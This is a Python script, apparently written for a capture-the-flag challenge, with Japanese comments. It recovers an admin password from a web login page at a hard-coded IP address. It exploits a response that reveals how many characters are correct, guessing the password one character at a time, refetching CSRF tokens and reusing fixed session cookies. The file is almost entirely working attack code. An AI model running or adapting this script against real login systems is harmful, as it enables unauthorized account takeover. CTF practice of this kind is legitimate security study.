# get_admin.py
import re
import time
import string
import requests
from urllib.parse import urljoin

BASE = "http://52.59.124.14:5015"
LOGIN_PATH = "/login.php"
USERNAME = "admin"

# ★指定の Cookie（期限切れなら差し替えてください）
FIXED_COOKIES = {
    "PHPSESSID": "7b598ad71b99eb80708d4cdec7c2437f",
    "webpy_session_id": "2f8752c17fb5b63ae949a6e94e3f13b7756d3cd6",
}

# 現実的な文字集合（必要に応じて追加）
ALPH = (
        string.ascii_lowercase +
        string.digits +
        string.ascii_uppercase +
        "_{}!@#$%^&*()-+=.:;?,/"
)

RX_HINT = re.compile(
    r"Invalid password,\s*but you got\s+(\d+)\s+characters\s+correct!?",
    re.I,
)

HEADERS = {
    "User-Agent": "ctf-bf/requests",
    "Accept-Encoding": "identity",
    "Referer": urljoin(BASE, "/index.php"),
}
TIMEOUT = 8
DELAY_BETWEEN_REQUESTS = 0.03  # 優しめに

def parse_count(html: str) -> int | None:
    m = RX_HINT.search(html)
    return int(m.group(1)) if m else None

def fetch_csrf(sess: requests.Session) -> str | None:
    """hidden CSRF があれば取得（無ければ None のままでOK）"""
    r = sess.get(urljoin(BASE, LOGIN_PATH), timeout=TIMEOUT, headers=HEADERS, allow_redirects=True)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text, re.I)
    return m.group(1) if m else None

def post_and_grab(sess: requests.Session, password: str, csrf: str | None):
    """フォーム送信 → 最終HTMLでヒント抽出。なければいくつかのURLを追加GETして拾う。"""
    data = {"username": USERNAME, "password": password}
    if csrf:
        data["csrf"] = csrf

    # 1) POST（requests は既定でリダイレクト追従）
    r = sess.post(urljoin(BASE, LOGIN_PATH), data=data, timeout=TIMEOUT, headers=HEADERS)
    html = r.text

    # 成功判定（必要なら語を追加）
    if any(k in html for k in ("Dashboard", "Logout", "Welcome")):
        return True, None

    cnt = parse_count(html)
    if cnt is not None:
        return False, cnt

    # 2) 追加 GET（Flash が “次の GET” で出るサイトへの保険）
    follow = [str(r.url), "/", "/index.php", LOGIN_PATH]
    seen = set()
    for path in follow:
        url = path if path.startswith("http") else urljoin(BASE, path)
        if url in seen:
            continue
        seen.add(url)
        g = sess.get(url, timeout=TIMEOUT, headers=HEADERS, allow_redirects=True)
        ghtml = g.text
        if any(k in ghtml for k in ("Dashboard", "Logout", "Welcome")):
            return True, None
        gcnt = parse_count(ghtml)
        if gcnt is not None:
            return False, gcnt

    # 見つからなかった
    return False, None

def try_one(sess: requests.Session, pwd: str) -> tuple[bool, int | None]:
    # CSRF がワンショット型でも安全なように毎回取得（不要なら None のまま）
    csrf = fetch_csrf(sess)
    ok, cnt = post_and_grab(sess, pwd, csrf)
    return ok, cnt

def main():
    s = requests.Session()
    s.headers.update(HEADERS)
    # 固定クッキー付与（必要なら UA/Referer も合わせてください）
    for k, v in FIXED_COOKIES.items():
        s.cookies.set(k, v, domain="52.59.124.14", path="/")

    prefix = ""
    while True:
        target_len = len(prefix) + 1
        hit_char = None

        for ch in ALPH:
            test = prefix + ch
            try:
                ok, cnt = try_one(s, test)
            except requests.RequestException as e:
                # 一時エラーは軽く待ってリトライ気味に続行
                print(f"[warn] {e}; retrying next...")
                time.sleep(0.2)
                continue

            if ok:
                print(f"PASSWORD = {test}")
                return

            print(f"[{test}] N={cnt if cnt is not None else '-'}")
            if cnt == target_len:
                hit_char = ch
                print(f"hit: {test}  (N={cnt})")
                break

            time.sleep(DELAY_BETWEEN_REQUESTS)

        if not hit_char:
            raise SystemExit(
                f"stalled at prefix='{prefix}'. "
                f"Cookie/文言/エンドポイント/ユーザー名を確認してください。"
            )

        prefix += hit_char
        print(f"→ {prefix}")

if __name__ == "__main__":
    main()